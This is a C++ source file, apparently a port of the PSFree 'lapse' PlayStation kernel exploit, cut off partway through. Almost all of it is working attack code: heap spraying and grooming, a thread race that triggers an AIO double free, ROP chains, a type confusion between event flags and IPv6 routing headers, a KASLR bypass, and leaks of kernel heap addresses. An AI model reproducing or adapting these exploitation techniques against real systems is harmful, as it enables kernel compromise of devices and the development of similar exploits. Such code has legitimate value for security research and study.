/* Copyright (C) 2025 anonymous
This file is a port of https://github.com/kmeps4/PSFree/blob/main/lapse.mjs
which is part of the PSFree project.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>. */

#include <mast1c0re.hpp>
#include "../helpers/helpers.cpp"
#include "../helpers/ruby_chan.cpp"
#include "../helpers/kernel_memory.cpp"
#include "../helpers/offsets.cpp"

extern "C" {
    extern const uint8_t payload_start[];
    extern const uint8_t payload_end[];
}

int32_t err = 0; // Global error variable

#define CPU_CORE 2

// Sets err, returns err
int32_t cpu_affinity_priority()
{
    uint64_t mask = 0;
    rtprio_s rtprio = {0};

    printf_debug("* Updating CPU affinity and priority...\n");

    // Get affinity
    err = get_affinity(&mask);
    if (err) goto end;
    printf_debug(
        "Initial affinity: %d %d %d %d %d %d %d %d\n",
        (int32_t)((mask >> 0) & 1), (int32_t)((mask >> 1) & 1),
        (int32_t)((mask >> 2) & 1), (int32_t)((mask >> 3) & 1),
        (int32_t)((mask >> 4) & 1), (int32_t)((mask >> 5) & 1),
        (int32_t)((mask >> 6) & 1), (int32_t)((mask >> 7) & 1)
    );

    // Pinning to `cpu_core`
    // Pin to 1 core so that we only use 1 per-cpu bucket.
    // This will make heap spraying and grooming easier.
    mask = 1 << CPU_CORE;
    err = set_affinity(&mask);
    if (err) goto end;
    // Recheck affinity
    mask = 0;
    err = get_affinity(&mask);
    if (err) goto end;
    printf_debug(
        "Updated affinity: %d %d %d %d %d %d %d %d\n",
        (int32_t)((mask >> 0) & 1), (int32_t)((mask >> 1) & 1),
        (int32_t)((mask >> 2) & 1), (int32_t)((mask >> 3) & 1),
        (int32_t)((mask >> 4) & 1), (int32_t)((mask >> 5) & 1),
        (int32_t)((mask >> 6) & 1), (int32_t)((mask >> 7) & 1)
    );

    // Get priority
    err = get_priority(&rtprio);
    if (err) goto end;
    printf_debug("Initial priority: type %d prio %d\n", rtprio.type, rtprio.prio);
    
    // Set priority to realtime 256 (highest we can achieve given our credentials)
    rtprio = { RTP_PRIO_REALTIME, 0x100 };
    err = set_priority(&rtprio);
    if (err) goto end;
    // Recheck priority
    rtprio = {0};
    err = get_priority(&rtprio);
    if (err) goto end;
    printf_debug("Updated priority: type %d prio %d\n", rtprio.type, rtprio.prio);

    end:
        return err;
}

// Max number of sockets is 127
#define NUM_SDS 120
#define NUM_WORKERS 2
#define NUM_GROOM_IDS 0x200
// Max number of req allocations per submission in one 0x80 malloc slab (3)
#define NUM_GROOM_REQS (0x80 / sizeof(SceKernelAioRWRequest))
#define ETIMEDOUT 60

struct setup_s
{
    unixpair_s              unixpair;
    int32_t                 sds[NUM_SDS];
    SceKernelAioSubmitId    block_id;
    SceKernelAioSubmitId    groom_ids[NUM_GROOM_IDS];
};
setup_s s0 = {0};

// Sets err, returns err
int32_t setup()
{
    SceKernelAioRWRequest block_reqs[NUM_WORKERS];
    SceKernelAioSubmitId test_id = 0;
    SceKernelAioRWRequest test_req = {0};
    SceKernelAioRWRequest groom_reqs[NUM_GROOM_REQS];
    useconds_t timeout = 1;
    uint32_t sock_count = 0;

    printf_debug("STAGE 0: Setup\n");

    // CPU pinning and priority
    err = cpu_affinity_priority();
    if (err) goto end;

    printf_debug("* Blocking SceAIO...\n");

    // Create a unix socketpair to use as a blocking primitive
    err = create_unixpair(&s0.unixpair);
    if (err) goto end;
    printf_debug("Unix socketpair created: block_fd %d unblock_fd %d\n",
        s0.unixpair.block_fd, s0.unixpair.unblock_fd);

    // This part will block the worker threads from processing entries so that
    // we may cancel them instead. this is to work around the fact that
    // aio_worker_entry2() will fdrop() the file associated with the aio_entry
    // on ps5. we want aio_multi_delete() to call fdrop()
    for (uint32_t i = 0; i < NUM_WORKERS; i++) {
        block_reqs[i].nbyte = 1;
        block_reqs[i].fd = s0.unixpair.block_fd;
    }
    aio_submit_cmd(
        SCE_KERNEL_AIO_CMD_READ,
        block_reqs,
        NUM_WORKERS,
        SCE_KERNEL_AIO_PRIORITY_HIGH,
        &s0.block_id
    );
    printf_debug("Blocking AIO requests submitted with ID: %d\n",
        s0.block_id);

    // Check if AIO is blocked
    test_req.fd = -1;
    aio_submit_cmd(
        SCE_KERNEL_AIO_CMD_READ,
        &test_req,
        1,
        SCE_KERNEL_AIO_PRIORITY_HIGH,
        &test_id
    );
    printf_debug("AIO test request submitted with ID: %d\n", test_id);
    reset_errno();
    aio_multi_wait(
        &test_id,
        1,
        aio_errs,
        SCE_KERNEL_AIO_WAIT_AND,
        &timeout
    );
    err = read_errno();
    free_aios(&test_id, 1);
    if (err != ETIMEDOUT) {
        printf_debug("SceAIO system not blocked. errno: %ld\n", err);
        err = -1;
        goto end;
    }
    printf_debug("SceAIO system blocked! errno: %ld\n", err);
    err = 0;

    printf_debug("* Spraying/grooming the heap...\n");

    // Heap spraying/grooming with AF_INET6 UDP sockets
    for (uint32_t i = 0; i < NUM_SDS; i++) {
        s0.sds[i] = create_ipv6udp();
        sock_count += (s0.sds[i] < 0) ? 0 : 1;
    }
    printf_debug("Heap sprayed with %d AF_INET6 UDP sockets!\n", sock_count);

    // Groom the heap with AIO requests
    for (uint32_t i = 0; i < NUM_GROOM_REQS; i++)
        groom_reqs[i].fd = -1;
    // Allocate enough so that we start allocating from a newly created slab
    spray_aio(
        s0.groom_ids,
        NUM_GROOM_IDS,
        groom_reqs,
        NUM_GROOM_REQS,
        false
    );
    // Cancel the groomed AIOs
    cancel_aios(s0.groom_ids, NUM_GROOM_IDS);
    printf_debug("Heap groomed with %d AIOs!\n", NUM_GROOM_IDS);

    end:
        return err;
}

struct in6_addr { uint8_t s6_addr[16]; };
template <size_t size>
struct ip6_rthdr
{
    static constexpr uint8_t len = ((size >> 3) - 1) & ~1;
    static constexpr uint8_t segleft = len >> 1;
    static constexpr uint8_t used_size = (len + 1) << 3;
    static constexpr uint8_t pad = size - used_size;
    uint8_t  ip6r_nxt = 0;
    uint8_t  ip6r_len = len;
    uint8_t  ip6r_type = 0;
    uint8_t  ip6r_segleft = segleft;
    uint32_t ip6r_reserved = 0;
    in6_addr ip6r_sigs[segleft] = {0};
    uint8_t  _pad[pad] = {0};
};

#define NUM_ALIAS 100
int32_t rthdr_sds[2] = {-1, -1};

// Returns 0 on success, -1 on failure, doesn't set err
int32_t make_aliased_rthdrs()
{
    int32_t *sds = s0.sds;
    ip6_rthdr<0x80> rthdr;

    for (uint32_t loop = 0; loop < NUM_ALIAS; loop++) {
        for (uint32_t i = 0; i < NUM_SDS; i++) {
            if (sds[i] < 0) continue; // Skip invalid sockets
            rthdr.ip6r_reserved = i; // Set a unique marker for each rthdr
            set_rthdr(sds[i], &rthdr, rthdr.used_size);
        }

        for (uint32_t i = 0; i < NUM_SDS; i++) {
            if (sds[i] < 0) continue; // Skip invalid sockets
            socklen_t len = rthdr.used_size;
            if (get_rthdr(sds[i], &rthdr, &len) != 0) continue;
            if (rthdr.ip6r_reserved == i) continue; // rthdr not aliased
            printf_debug("Aliased rthdrs %d & %d found at attempt: %d\n",
                i, rthdr.ip6r_reserved, loop);
            hexdump((uint8_t*)&rthdr, 0x80);
            rthdr_sds[0] = sds[i];
            rthdr_sds[1] = sds[rthdr.ip6r_reserved];
            printf_debug("rthdr_sds: %d %d\n", rthdr_sds[0], rthdr_sds[1]);
            sds[i] = -1;
            sds[rthdr.ip6r_reserved] = -1;
            free_rthdrs(sds, NUM_SDS);
            // Recreate the missing sockets
            sds[i] = create_ipv6udp();
            sds[rthdr.ip6r_reserved] = create_ipv6udp();
            return 0;
        }
    }
    printf_debug("Failed to make aliased rthdrs!\n");
    return -1;
}

#define NUM_REQS 3
#define WHICH_REQ NUM_REQS - 1
#define NUM_RACES 100

#define SCE_KERNEL_ERROR_ESRCH 0x80020003
#define TCP_INFO 0x20
#define SIZE_TCP_INFO 0xec // Size of the TCP info structure
#define TCPS_ESTABLISHED 4

ScePthreadBarrier barrier = 0;
int32_t race_errs[2] = {0};
uint8_t thr_chain_buf[0x4000] __attribute__((aligned(16))) = {0};
uint8_t chain_buf[0x200] __attribute__((aligned(16))) = {0};

// Sets err, returns err
int32_t race_one(SceKernelAioSubmitId id, int32_t sd_conn)
{
    ROP_Chain thr_chain = ROP_Chain((uint64_t*)thr_chain_buf, 0x4000);
    ROP_Chain chain = ROP_Chain((uint64_t*)chain_buf, 0x200);
    if (!thr_chain.is_initialized() || !chain.is_initialized())
    {
        printf_debug("Failed to initialize ROP chains!\n");
        return (err = -1);
    }
    printf_debug("* Starting race...\n");

    int64_t rax = 0;
    {
    // Set thread affinity and priority
    uint64_t mask = 1 << CPU_CORE;
    thr_chain.push_call(
        LIBKERNEL(LIB_KERNEL_CPUSET_SETAFFINITY),
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        -1,
        8,
        PVAR_TO_NATIVE(&mask)
    );
    rtprio_s rtprio = { RTP_PRIO_REALTIME, 0x100 };
    thr_chain.push_call(
        LIBKERNEL(LIB_KERNEL_RTPRIO_THREAD),
        RTP_SET,
        0,
        PVAR_TO_NATIVE(&rtprio)
    );
    // Ready signal
    thr_chain.set_RAX(1);
    thr_chain.get_result(&rax);
    // Enter barrier
    thr_chain.push_call(
        LIBKERNEL(LIB_KERNEL_PTHREAD_BARRIER_WAIT),
        PVAR_TO_NATIVE(&barrier)
    );
    // Trigger AIO delete
    thr_chain.push_call(
        LIBKERNEL(LIB_KERNEL_SCE_KERNEL_AIO_DELETE_REQUESTS),
        PVAR_TO_NATIVE(&id),
        1,
        PVAR_TO_NATIVE(race_errs)
    );
    thr_chain.push_call(
        EBOOT(EBOOT_WRITE_STUB),
        debug_sock,
        PVAR_TO_NATIVE("Exiting...\n"),
        11
    );
    }

    ScePthread thread = 0;
    err = thr_chain.execute(&thread);
    if (err) printf_debug("Failed to execute threaded ROP chain!\n");
    if (err) return err;
    printf_debug("Thread spawned! ID: %ld\n", thread);

    // Since the ps4's cores only have 1 hardware thread each, we can pin 2
    // threads on the same core and control the interleaving of their
    // executions via controlled context switches

    // Wait for the worker to enter the barrier and sleep
    // Yielding allows the worker to run
    while (rax == 0)
        PS::Breakout::call(LIBKERNEL(LIB_KERNEL_SCHED_YIELD));

    int64_t ret = -1;
    {
    // Enter the barrier as the last waiter
    chain.push_call(
        LIBKERNEL(LIB_KERNEL_SCE_PTHREAD_BARRIER_WAIT),
        PVAR_TO_NATIVE(&barrier)
    );
    // Yield and hope the scheduler runs the worker next. the worker will then
    // sleep at soclose() and hopefully we run next
    chain.push_call(LIBKERNEL(LIB_KERNEL_SCHED_YIELD));
    // If we get here and the worker hasn't been reran then we can delay the
    // worker's execution of soclose() indefinitely
    chain.push_call(
        LIBKERNEL(LIB_KERNEL_PTHREAD_SUSPEND_USER_CONTEXT_NP),
        thread
    );
    chain.get_result(&ret);
    }

    err = chain.execute();
    if (err) printf_debug("Failed to execute ROP chain!\n");
    if (err) return err;

    printf_debug("ROP chain executed!\n");

    if (ret != 0)
    {
        printf_debug("Failed to suspend thread! Error: %p\n", read_errno());
        scePthreadJoin(thread, 0); // Wait for the thread to finish
        return (err = -1);
    }

    bool won_race = false;

    // Poll AIO state
    SceKernelAioError poll_err = 0;
    aio_multi_poll(&id, 1, &poll_err);
    printf_debug("Poll: 0x%08x\n", poll_err);

    // Get TCP info
    uint8_t info_buf[SIZE_TCP_INFO] = {0};
    socklen_t info_size = SIZE_TCP_INFO;
    err = PS::getsockopt(sd_conn, IPPROTO_TCP, TCP_INFO, info_buf, &info_size);

    if (err || info_size != SIZE_TCP_INFO) {
        printf_debug("Failed to get TCP info! SIZE_TCP_INFO %d info_size %d\n",
            SIZE_TCP_INFO, info_size);
        PS::Breakout::call(
            LIBKERNEL(LIB_KERNEL_PTHREAD_RESUME_USER_CONTEXT_NP),
            thread
        );
        scePthreadJoin(thread, 0); // Wait for the thread to finish
        printf_debug("Thread exited.\n");
        return (err = -1);
    }

    printf_debug("TCP info retrieved! info_size: %d\n", info_size);

    uint8_t tcp_state = info_buf[0];
    printf_debug("tcp_state: %d\n", tcp_state);

    // To win, must make sure that poll_res == 0x10003/0x10004 and tcp_state == 5
    if (poll_err != SCE_KERNEL_ERROR_ESRCH && tcp_state != TCPS_ESTABLISHED)
    {
        // PANIC: double free on the 0x80 malloc zone. Important kernel
        // data may alias
        aio_multi_delete(&id, 1, &poll_err);
        won_race = true;
    }

    PS::Breakout::call(
        LIBKERNEL(LIB_KERNEL_PTHREAD_RESUME_USER_CONTEXT_NP),
        thread
    );
    scePthreadJoin(thread, 0); // Wait for the thread to finish
    printf_debug("Thread exited.\n");

    err = -1;
    if (!won_race) return err;

    printf_debug("Race errors: 0x%08x 0x%08x\n", race_errs[0], race_errs[1]);
    // If the code has no bugs then this isn't possible but we keep the
    // check for easier debugging
    if (race_errs[0] != race_errs[1])
        printf_debug("ERROR: bad won_race!\n");
    else
        // RESTORE: double freed memory has been reclaimed with harmless data
        // PANIC: 0x80 malloc zone pointers aliased
        err = make_aliased_rthdrs();

    return err;
}

int32_t sd_listen = -1;

// Sets err, returns err
int32_t double_free_reqs()
{
    printf_debug("STAGE 1: Double free AIO queue entry\n");

    err = scePthreadBarrierInit(&barrier, 0, 2, 0);
    if (err) return err;
    printf_debug("Barrier initialized! %p\n", barrier);

    sockaddr_in server_addr = {0};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = PS::htons(5050);
    server_addr.sin_addr.s_addr = PS::htonl(0x7f000001); // 127.0.0.1

    SceKernelAioRWRequest reqs[NUM_REQS] = {0};
    SceKernelAioSubmitId req_ids[NUM_REQS] = {0};
    SceKernelAioError req_errs[NUM_REQS] = {0};

    for (uint32_t i = 0; i < NUM_REQS; i++)
        reqs[i].fd = -1;

    sd_listen = PS::socket(AF_INET, SOCK_STREAM, 0);
    if (sd_listen < 0) printf_debug("Failed to create sd_listen: %p\n", read_errno());
    if (sd_listen < 0) return (err = -1);

    int32_t optval = 1;
    err = PS::setsockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int32_t));
    if (err) printf_debug("Failed to set SO_REUSEADDR on sd_listen: %p\n", read_errno());
    if (err) return (err = -1);

    err = PS::bind(sd_listen, (sockaddr*)&server_addr, sizeof(sockaddr_in));
    if (err) printf_debug("Failed to bind socket: %p\n", read_errno());
    if (err) return (err = -1);
    
    err = PS::listen(sd_listen, 1);
    if (err) printf_debug("Failed to listen on socket: %p\n", read_errno());
    if (err) return (err = -1);

    for (uint32_t i = 0; i < NUM_RACES; i++) {
        int32_t sd_client = PS::socket(AF_INET, SOCK_STREAM, 0);
        if (sd_client < 0) printf_debug("Failed to create sd_client: %p\n", read_errno());
        if (sd_client < 0) continue;

        PS::connect(sd_client, (sockaddr *)&server_addr, sizeof(server_addr));
        int32_t sd_conn = PS::accept(sd_listen, 0, 0);
        if (sd_conn < 0) {
            printf_debug("Failed to establish connection: %p\n", read_errno());
            PS::close(sd_client);
            continue;
        }

        // Force soclose() to sleep
        linger optval_client = {1, 1};
        if (PS::setsockopt(
            sd_client, SOL_SOCKET, SO_LINGER, &optval_client, sizeof(optval_client)
        ) != 0)
        {
            printf_debug("Failed to set SO_LINGER on client socket: %p\n", read_errno());
            PS::close(sd_conn);
            PS::close(sd_client);
            continue;
        }

        printf_debug("sd_listen: %d sd_client: %d sd_conn: %d\n",
            sd_listen, sd_client, sd_conn);

        reqs[WHICH_REQ].fd = sd_client;
        aio_submit_cmd(
            SCE_KERNEL_AIO_CMD_READ | SCE_KERNEL_AIO_CMD_MULTI,
            reqs,
            NUM_REQS,
            SCE_KERNEL_AIO_PRIORITY_HIGH,
            req_ids
        );
        aio_multi_cancel(req_ids, NUM_REQS, req_errs);
        aio_multi_poll(req_ids, NUM_REQS, req_errs);

        printf_debug("AIOs submitted! IDs: %d %d %d\n",
            req_ids[0], req_ids[1], req_ids[2]);

        // Drop the reference so that aio_multi_delete() will trigger _fdrop()
        PS::close(sd_client);

        err = race_one(req_ids[WHICH_REQ], sd_conn);

        // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got 
        // decremented twice. this will leave one request undeleted
        aio_multi_delete(req_ids, NUM_REQS, req_errs);
        PS::close(sd_conn);

        if (err) return err;

        printf_debug("Won race at attempt %d\n", i);
        PS::close(sd_listen);
        scePthreadBarrierDestroy(&barrier);
        barrier = 0;
        return err;
    }

    printf_debug("Failed aio double free!\n");
    return (err = -1);
}

struct aio_entry
{
    uint32_t ar2_cmd;              // 0x00
    uint32_t ar2_ticket;           // 0x04
    uint8_t _unk1[8];              // 0x08
    ptr64_t ar2_reqs1;             // 0x10
    ptr64_t ar2_info;              // 0x18
    ptr64_t ar2_batch;             // 0x20
    ptr64_t ar2_spinfo;            // 0x28
    SceKernelAioResult ar2_result; // 0x30
    uint64_t ar2_file;             // 0x40
    ptr64_t _unkptr1;              // 0x48
    ptr64_t ar2_qentry;            // 0x50
    // align to 0x80
    uint8_t _pad2[0x28];
};

struct aio_batch
{
    uint32_t ar3_num_reqs; // 0x00
    uint32_t ar3_reqs_left; // 0x04
    uint32_t ar3_state; // 0x08
    uint32_t ar3_done; // 0x0c
    uint8_t _unk1[0x18]; // 0x10-0x28
    uint32_t lock_object_flags; // 0x28
    uint8_t _unk2[0x0c]; // 0x2c-0x38
    uint64_t lock_object_lock; // 0x38
};

bool verify_reqs2(aio_entry *reqs2)
{
    uint32_t prefix = 0;

    if (reqs2->ar2_cmd != SCE_KERNEL_AIO_CMD_WRITE)
        return false;

    // Example of heap addresses: 0xfffff0970a1e8780
    // They all should be prefixed by 0xffff
    if (reqs2->ar2_reqs1 >> 8*6 != 0xffff)
        return false;
    // and they must share the first 4 bytes (e.g. 0xfffff097)
    prefix = reqs2->ar2_reqs1 >> 8*4;

    if (reqs2->ar2_info >> 8*4 != prefix)
        return false;
    if (reqs2->ar2_batch >> 8*4 != prefix)
        return false;

    // state must be in the range [1,4], and _pad must be 0
    if (!(0 < reqs2->ar2_result.state && reqs2->ar2_result.state <= 4))
        return false;
    if (reqs2->ar2_result._pad != 0)
        return false;

    // ar2_file must be NULL since we passed a bad file descriptor to
    // aio_submit_cmd()
    if (reqs2->ar2_file != 0) {
        return false;
    }

    if (reqs2->_unkptr1 != 0) // Offset 0x48 can be NULL
    if (reqs2->_unkptr1 >> 8*4 != prefix)
        return false;

    if (reqs2->ar2_qentry >> 8*4 != prefix)
        return false;

    return true;
}

#define NUM_LEAKED_BLOCKS 16
#define NUM_HANDLES 256
// Max number of req allocations per submission in one 0x100 malloc slab (6)
#define NUM_ELEMS (0x100 / sizeof(SceKernelAioRWRequest))
#define NUM_LEAKS 5

struct stage2_s
{
    uint8_t buf[0x80 * NUM_LEAKED_BLOCKS] = {0};
    socklen_t len = 0x80;
    SceKernelEventFlag evf = 0;
    ptr64_t evf_cv_str_p = 0;
    ptr64_t evf_p = 0;
    ptr64_t kernel_base = 0;
    ptr64_t kaslr_offset = 0;
    ptr64_t reqs1 = 0;
    aio_entry *req2 = 0;
    SceKernelAioSubmitId target_id = 0;
    ptr64_t batch_p = 0;
    SceKernelAioSubmitId batch_ids[NUM_HANDLES] = {0};
};
stage2_s s2;

// Sets err, returns err
int32_t leak_kernel_addrs()
{
    printf_debug("STAGE 2: Leak kernel addresses\n");

    PS::close(rthdr_sds[1]);
    rthdr_sds[1] = -1;

    // Type confuse a struct evf with a struct ip6_rthdr
    printf_debug("* Confuse evf with rthdr\n");

    SceKernelEventFlag evfs[NUM_HANDLES];

    for (uint32_t i = 0; i < NUM_ALIAS; i++)
    {
        PS2::memset(evfs, 0, sizeof(evfs));
        for (uint32_t j = 0; j < NUM_HANDLES; j++)
            // By setting evf flags to >= 0x0f00, the value rthdr.ip6r_len will
            // be 0x0f (15), allowing to leak the full contents of the rthdr.
            // `| j << 16` bitwise shenanigans will help locating evfs later
            new_evf(&evfs[j], 0x0f00 | j << 16);

        get_rthdr(rthdr_sds[0], s2.buf, &s2.len);
        uint32_t bit_pattern = ((uint32_t*)s2.buf)[0];
        if ((bit_pattern >> 16) < NUM_HANDLES)
        {
            s2.evf = evfs[bit_pattern >> 16];
            // Confirm our finding
            set_evf_flags(s2.evf, bit_pattern | 1);
            get_rthdr(rthdr_sds[0], s2.buf, &s2.len);
            if (((uint32_t*)s2.buf)[0] == (bit_pattern | 1))
                evfs[bit_pattern >> 16] = 0;
            else
                s2.evf = 0;
        }

        for (uint32_t j = 0; j < NUM_HANDLES; j++)
            if (evfs[j] != 0) free_evf(evfs[j]);

        if (s2.evf == 0) continue;
        printf_debug("Confused rthdr and evf at attempt: %d\n", i);
        hexdump(s2.buf, 0x80);
        break;
    }

    if (s2.evf == 0)
    {
        printf_debug("Failed to confuse evf with rthdr!\n");
        return (err = -1);
    }

    // Fields we use from evf:
    // struct evf:
    //     uint64_t flags // 0x0
    //     struct {
    //         uint64_t cv_description; // 0x28: pointer to "evf cv"
    //         ...
    //     } cv;
    //     struct { // TAILQ_HEAD(struct evf_waiter)
    //         struct evf_waiter *tqh_first; // 0x38: pointer to first waiter
    //         struct evf_waiter **tqh_last; // 0x40: pointer to last's next
    //     } waiters;

    // evf.cv.cv_description = "evf cv"
    // The string is located at the kernel's mapped ELF file
    s2.evf_cv_str_p = *(uint64_t*)(&s2.buf[0x28]);
    printf_debug("\"evf cv\" string address found! %p\n",
        s2.evf_cv_str_p);

    s2.kernel_base = s2.evf_cv_str_p - K_EVF_OFFSET;
    s2.kaslr_offset = s2.kernel_base - BASE;

    // "evf cv" offset from kernel base is defined as K_EVF_OFFSET
    printf_debug("DEFEATED KASLR! Kernel base for FW (%d): %p\n",
        FIRMWARE, s2.kernel_base);
    printf_debug("KASLR offset: %p\n", s2.kaslr_offset);

    // Because of TAILQ_INIT() (a linked list macro), we have:
    // evf.waiters.tqh_last == &evf.waiters.tqh_first (closed loop)
    // It's the real address of the leaked `evf` object in the kernel heap
    s2.evf_p = *(uint64_t*)(&s2.buf[0x40]) - (uint64_t)0x38;
    
    // %p only works for 64-bit addresses when prefixed with 0xffffffff
    // for some reason.. We can blame PS2::vsprintf for that.
    printf_debug("Leaked evf address (kernel heap): 0x%08x%08x\n",
        (uint32_t)(s2.evf_p >> 32), (uint32_t)s2.evf_p);

    // Setting rthdr.ip6r_len to 0xff, allowing to read the next 0x80 blocks,
    // leaking adjacent objects
    set_evf_flags(s2.evf, 0xff00);
    s2.len *= NUM_LEAKED_BLOCKS;

    SceKernelAioRWRequest leak_reqs[NUM_ELEMS] = {0};
    SceKernelAioSubmitId leak_ids[NUM_ELEMS * NUM_HANDLES] = {0};

    // Use reqs1 to fake a aio_info. Set .ai_cred (offset 0x10) to offset 4 of
    // the reqs2 so crfree(ai_cred) will harmlessly decrement .ar2_ticket
    ptr64_t ucred = s2.evf_p + 4;
    leak_reqs[0].buf = ucred;
    for (uint32_t i = 0; i < NUM_ELEMS; i++)
        leak_reqs[i].fd = -1;

    printf_debug("* Find aio_entry\n");

    uint32_t reqs2_off = 0;
    for (uint32_t i = 0; i < NUM_LEAKS; i++) {
        spray_aio(
            leak_ids,
            NUM_HANDLES,
            leak_reqs,
            NUM_ELEMS,
            true,
            SCE_KERNEL_AIO_CMD_WRITE
        );
        get_rthdr(rthdr_sds[0], s2.buf, &s2.len);
        for (uint32_t off = 0x80; off < s2.len; off += 0x80) {
            if (!verify_reqs2((aio_entry *)&s2.buf[off])) continue;
            reqs2_off = off;
            printf_debug("Found reqs2 at attempt: %d\n", i);
            hexdump(&s2.buf[off], 0x80);
            goto loop_break;
        }
        free_aios(leak_ids, NUM_ELEMS * NUM_HANDLES);
    }
    loop_break:

    if (reqs2_off == 0) {
        printf_debug("Could not leak a reqs2!\n");
        return (err = -1);
    }
    printf_debug("reqs2 offset: %p\n", reqs2_off);
    s2.req2 = (aio_entry *)&s2.buf[reqs2_off];

    // reqs1 lives in the 0x100 zone
    s2.reqs1 = s2.req2->ar2_reqs1;
    printf_debug("reqs1: 0x%08x%08x\n", 
        (uint32_t)(s2.reqs1 >> 32), (uint32_t)s2.reqs1);
    s2.reqs1 &= -0x100LL;
    printf_debug("reqs1: 0x%08x%08x\n",
        (uint32_t)(s2.reqs1 >> 32), (uint32_t)s2.reqs1);

    printf_debug("* Searching target_id\n");

    SceKernelAioSubmitId *to_cancel_p = 0;
    uint32_t to_cancel_len = 0;

    for (uint32_t i = 0; i < NUM_ELEMS * NUM_HANDLES; i += NUM_ELEMS)
    {
        aio_multi_cancel(&leak_ids[i], NUM_ELEMS, aio_errs);
        get_rthdr(rthdr_sds[0], s2.buf, &s2.len);
        if (s2.req2->ar2_result.state != SCE_KERNEL_AIO_STATE_ABORTED)
            continue;
        printf_debug("Found target_id at batch: %d\n", i / NUM_ELEMS);
        hexdump((uint8_t *)s2.req2, 0x80);
        s2.target_id = leak_ids[i];
        leak_ids[i] = 0; // target_id won't be freed by free_aios2
        printf_debug("target_id: %p\n", s2.target_id);
        to_cancel_p = &leak_ids[i + NUM_ELEMS];
        to_cancel_len = (NUM_ELEMS * NUM_HANDLES) - (i + NUM_ELEMS);
        break;
    }

    if (s2.target_id == 0)
    {
        printf_debug("Failed to find target_id!\n");
        free_aios(leak_ids, NUM_ELEMS * NUM_HANDLES);
        return (err = -1);
    }

    cancel_aios(to_cancel_p, to_cancel_len);
    free_aios2(leak_ids, NUM_ELEMS * NUM_HANDLES);

    // At this point we have:
    // target_id => cancelled, but not deleted
    // leak_ids => all cancelled and deleted
    //
    // We need to clarify certain things: target_id doesn't necessarily match
    // the aio_entry we leaked, but rather, it matches the very first request
    // of the batch that our leaked object belongs to. That object by its own
    // has no use but leaking its SceKernelAioRWRequest's pointer (ar2_reqs1)
    // that lives in the same 0x100 block as all other SceKernelAioRWRequest.
    //
    // Another thing to take into consideration is the fact we used the first
    // ar2_reqs1 in the batch to fake an aio_info (leak_reqs[0].buf = ucred),
    // thus, we had to preserve it. Later we will set an .ar2_info of another
    // entry to the .ar2_reqs1 we leaked, which would allow us to double free
    // it when deleting both entries. Some internal cleanup function will try
    // to access .ar2_info->ai_cred to decrement it before freeing .ar2_info,
    // and this would result in a crash as .ar2_reqs1 does not have it. Thus,
    // the line `leak_reqs[0].buf = ucred` will fake it to prevent the crash.

    /*
    printf_debug("* Faking an aio_batch\n");

    int32_t *sds = s0.sds;
    aio_batch *fake_batch = (aio_batch *)&leak_reqs;

    leak_reqs[0].buf = 0;
    leak_reqs[0].fd = 0;
    leak_reqs[1].fd = 0;
    leak_reqs[2].fd = 0;
    fake_batch->ar3_num_reqs = 1;
    fake_batch->ar3_reqs_left = 0;
    fake_batch->ar3_state = SCE_KERNEL_AIO_STATE_COMPLETED;
    fake_batch->ar3_done = 0;
    // .ar3_lock.lock_object.lo_flags = (
    //     LO_SLEEPABLE | LO_UPGRADABLE
    //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
    //     | 6 << LO_CLASSSHIFT
    //     | LO_INITIALIZED
    // )
    fake_batch->lock_object_flags = 0x67b0000;
    // .ar3_lock.lk_lock = LK_UNLOCKED
    fake_batch->lock_object_lock = 1;

    uint32_t batch_off = 0;
    SceKernelAioSubmitId batch_ids[NUM_HANDLES * NUM_LEAKS] = {0};
    for (uint32_t i = 0; i < NUM_HANDLES * NUM_LEAKS; i += NUM_HANDLES) {
        spray_aio(
            &batch_ids[i],
            NUM_HANDLES,
            leak_reqs,
            NUM_GROOM_REQS,
            false
        );
        get_rthdr(rthdr_sds[0], s2.buf, &s2.len);
        for (uint32_t off = 0x80; off < s2.len; off += 0x80) {
            if (((aio_batch *)&s2.buf[off])->lock_object_flags != 0x67b0000)
                continue;
            batch_off = off;
            printf_debug("Found fake aio_batch at batch: %d\n", i / NUM_ELEMS);
            hexdump(&s2.buf[off], 0x80);
            for (uint32_t j = 0; j < NUM_HANDLES; j++)
            {
                s2.batch_ids[j] = batch_ids[i + j];
                batch_ids[i + j] = 0;
            }
            goto loop_break2;
        }
    }
    loop_break2:

    for (uint32_t i = 0; i < NUM_HANDLES * NUM_LEAKS; i += NUM_HANDLES)
        if (batch_ids[i] != 0)
            free_aios(&batch_ids[i], NUM_HANDLES);

    if (batch_off == 0) {
        printf_debug("Failed to leak the faked aio_batch!\n");
        return (err = -1);
    }

    s2.batch_p = s2.evf_p + batch_off;
    printf_debug("Fake aio_batch address: 0x%08x%08x\n",
        (uint32_t)(s2.batch_p >> 32), (uint32_t)s2.batch_p);
    */

    return err;
}

int32_t pktopts_sds[2] = {-1, -1};

// This function expects that all sockets have their pktopts freed
int32_t make_aliased_pktopts()
{
    int32_t *sds = s0.sds;

    for (uint32_t loop = 0; loop < NUM_ALIAS * 10; loop++)
    {
        for (uint32_t i = 0; i < NUM_SDS; i++)
        {
            if (sds[i] < 0) continue; // Skip invalid sockets
            PS::setsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, &i, sizeof(i));
        }

        for (uint32_t i = 0; i < NUM_SDS; i++)
        {
            if (sds[i] < 0) continue; // Skip invalid sockets
            uint32_t tclass = 0;
            socklen_t len = sizeof(tclass);
            err = PS::getsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, &tclass, &len);
            if (err) continue;
            if (tclass == i) continue; // tclass not aliased
            printf_debug("Aliased pktopts %d & %d found at attempt: %d\n",
                i, tclass, loop);
            pktopts_sds[0] = sds[i];
            pktopts_sds[1] = sds[tclass];
            printf_debug("pktopts_sds: %d %d\n", pktopts_sds[0], pktopts_sds[1]);
            // Recreate the missing sockets
